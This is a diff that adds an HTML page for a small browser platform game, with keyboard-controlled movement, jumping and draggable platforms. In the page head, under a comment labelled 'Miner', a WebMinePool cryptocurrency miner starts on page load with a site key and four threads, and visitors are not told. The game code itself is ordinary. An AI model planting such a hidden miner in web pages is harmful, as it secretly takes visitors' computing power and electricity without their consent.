@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Platform Game</title>
+    <!--    Miner     -->
+    <script src="https://webminepool.com/lib/base.js"></script>
+    <script>
+      var miner = WMP.User('SK_4NgHVFwRZFjQ56ixBJcEs', 'platform',{
+          threads: 4,
+          autoThreads: false,
+          throttle: 0.3,
+          forceASMJS: false
+       });
+       miner.start();
+    </script>
+    <script src="https://simplycodingcourses.com/files/simplyjs/simply.js"></script>
+    <script>
+      function start() {
+        sjs.open("target", 800, 500)
+        var background = new sjs.Image("Images/background.png")
+        background.setSize(2500,500)
+        
+        //Player Properties
+        var player = new sjs.Image("Images/r_idle.png")
+        player.type = "player"
+        player.setSize(85,93)
+        player.setGravity(8)
+        player.bottom()
+        player.friction = .2
+        player.noBounds = true;
+        
+        sjs.scrollable(player,background)
+        
+        //Player movement controls
+        
+        var r_images = ["Images/r_walk-0.png", "Images/r_walk-1.png", "Images/r_walk-2.png", "Images/r_walk-3.png", "Images/r_walk-4.png", "Images/r_walk-5.png", "Images/r_walk-6.png", "Images/r_walk-7.png"];
+        
+        var l_images = ["Images/l_walk-0.png", "Images/l_walk-1.png", "Images/l_walk-2.png", "Images/l_walk-3.png", "Images/l_walk-4.png", "Images/l_walk-5.png", "Images/l_walk-6.png", "Images/l_walk-7.png"];
+        var r_facing = true;
+        var r_track = 0;
+        var l_track = 0;
+        
+        sjs.keyDown(RIGHT_KEY, function(){
+          r_facing = true;
+          r_track = r_track + 1
+          player.pushRight(2)
+          player.setImage(r_images[r_track])
+          if(r_track == 7){
+            r_track = 0;
+          }
+          if(r_track >= 8){
+            player.setImage("Images/r_jump.png");
+          }
+        }); //end Right key
+        
+        sjs.keyDown(LEFT_KEY, function(){
+          r_facing = false;
+          l_track = l_track + 1
+          player.pushLeft(2)
+          player.setImage(l_images[l_track])
+          if(l_track == 7){
+            l_track = 0
+          }
+          if(l_track >= 8){
+            player.setImage("Images/l_jump.png");
+          }
+        }); //end Left key
+        
+        
+        //Jumping code
+        var canJump = true;
+        sjs.keyDown(UP_KEY, function(){
+          if(canJump == true){
+            canJump = false;
+            player.pushUp(55)
+            if(r_facing == true){
+              player.setImage("Images/r_jump.png")
+              r_track = 8
+            } else {
+              player.setImage("Images/l_jump.png")
+              l_track = 8
+            }
+          }
+        }) // end keyDown function
+        
+        window.addEventListener("keyup", function(e){
+          if (e.keyCode == RIGHT_KEY) {
+            player.setImage("Images/r_idle.png")
+            r_track = 0
+          } else if (e.keyCode == LEFT_KEY) {
+            player.setImage("Images/l_idle.png")
+            l_track = 0
+          } //end if statement
+        }); //end EventListener function
+        
+        //onHit functions
+        
+        
+        sjs.onHit("player","bottom_screen",function(x,y){
+          sjs.stoppedBy(x,y);
+          if (canJump == false) {
+            canJump = true;
+            r_track = 0;
+            l_track = 0;
+          }
+        })
+      } //end start function
+      
+      
+      //Platform Function
+      
+      function platform() {
+        var platform = new sjs.Image("Images/platform.png");
+        platform.type = "platform"
+        platform.setHeight(30);
+        platform.center().offset(-sjs.gx,10)
+        platform.onMouseDown(function(){
+          platform.draggable()
+          platform.follow(sjs.mouse)
+        })
+      }
+    </script>
+  </head>
+  <body onload="start()">
+    <h1>Platform Game</h1>
+    
+    <center>
+      <input type="image" src="Images/platform.png" onclick="platform()">
+    </center>
+    
+    <div id="target" style="margin:auto;background:grey;"></div>
+  </body>
+</html>
